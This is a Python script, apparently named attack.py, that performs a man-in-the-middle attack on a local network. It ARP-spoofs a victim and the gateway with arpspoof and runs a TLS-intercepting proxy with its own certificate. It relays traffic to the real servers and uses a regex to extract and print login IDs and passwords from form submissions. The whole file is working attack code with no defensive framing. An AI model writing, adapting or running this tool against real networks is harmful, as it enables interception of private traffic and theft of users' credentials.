import os
import socket
import ssl
import threading
import subprocess
import sys
import re

VICTIM_IP = sys.argv[1]
INTERFACE = sys.argv[2]
GATEWAY_IP = None
MITM_CERT = "certificates/host.crt"
MITM_KEY = "certificates/host.key"
BUFFER_SIZE = 8192

def get_gateway_ip():
    try:
        result = subprocess.check_output("ip route show default", shell=True).decode()
        match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result)
        if match:
            return match.group(1)
    except Exception as e:
        print(f"[ERROR] Failed to retrieve gateway IP: {e}")
    return None


def start_arp_spoof():
    print("[*] Starting ARP Spoofing...")
    if not GATEWAY_IP:
        print("[ERROR] Could not determine the gateway IP. Exiting.")
        sys.exit(1)
    try:
        subprocess.Popen(["sudo", "arpspoof", "-i", INTERFACE, "-t", VICTIM_IP, GATEWAY_IP], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(["sudo", "arpspoof", "-i", INTERFACE, "-t", GATEWAY_IP, VICTIM_IP], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[ERROR] Failed to start ARP Spoofing: {e}")


def extract_host_from_request(request):
    try:
        host_match = re.search(r'Host:\s*([^\r\n]+)', request.decode(errors='ignore'))
        if host_match:
            return host_match.group(1)
        # Check for SNI field in TLS handshake (ClientHello)
        sni_match = re.search(rb'\x00[\x00-\xFF]\x00\x00\x17\x00\x00[\x00-\xFF]+\x00([a-zA-Z0-9.-]+)', request)
        if sni_match:
            return sni_match.group(1).decode(errors='ignore')

    except Exception as e:
        print(f"[ERROR] Failed to extract host: {e}")

    return None

def handle_client(client_socket):
    # print("[*] Intercepting TLS connection...")

    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=MITM_CERT, keyfile=MITM_KEY)
        client_tls = context.wrap_socket(client_socket, server_side=True)

        request = client_tls.recv(BUFFER_SIZE)
        target_host = extract_host_from_request(request)
        target_port = 443

        if not target_host:
            print("[ERROR] Could not determine target host, closing connection.")
            client_tls.close()
            return
        # print(f"[*] target host: {target_host}")

        # with real server
        server_context = ssl.create_default_context()
        raw_server_socket = socket.create_connection((target_host, target_port))
        server_tls = server_context.wrap_socket(raw_server_socket, server_hostname=target_host)

        # print(f"[*] TLS Handshake with {target_host} completed.")
        # print(f"[*] Forwarding TLS traffic between victim and {target_host}")

        # Send the intercepted request to the real server
        server_tls.sendall(request)

        # Start full-duplex forwarding
        threading.Thread(target=forward_traffic, args=(client_tls, server_tls, "Client -> Server")).start()
        threading.Thread(target=forward_traffic, args=(server_tls, client_tls, "Server -> Client")).start()

    except Exception as e:
        print(f"[ERROR] {e}")
        client_socket.close()

def extract_credentials(data):
    try:
        decoded_data = data.decode(errors='ignore')

        match = re.search(r'id=([^&]+)&pwd=([^&]+)&recaptchaToken=([^&]+)', decoded_data)
        if match:
            user_id = match.group(1)
            password = match.group(2)
            recaptcha_token = match.group(3)
            print(f"[INFO] ID: {user_id}, Password: {password}")

    except Exception as e:
        print(f"[ERROR] Failed to extract credentials: {e}")


def forward_traffic(source, destination, direction):
    # print(f"[*] forwarding ({direction})...")
    try:
        while True:
            data = source.recv(BUFFER_SIZE)
            if not data:
                # print(f"[DEBUG] No more data to forward ({direction}). Closing connection.")
                break
            extract_credentials(data)
            destination.sendall(data)
    except Exception as e:
        print(f"[ERROR] Connection error ({direction}): {e}")

    finally:
        source.close()
        destination.close()


def mitm_tls_proxy():
    print("[*] Starting MITM TLS Proxy on port 8080...")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", 8080))
    server_socket.listen(5)

    while True:
        client_socket, client_addr = server_socket.accept()
        print(f"[*] Connection received from {client_addr}")
        threading.Thread(target=handle_client, args=(client_socket,)).start()

if __name__ == "__main__":
    if not VICTIM_IP:
        print("Usage: sudo python3 attack.py <victim_ip> [interface]")
        sys.exit(1)
    GATEWAY_IP = get_gateway_ip()
    start_arp_spoof()

    try:
        mitm_tls_proxy()
    except KeyboardInterrupt:
        print("[*] Stopping attack...")
        sys.exit(0)
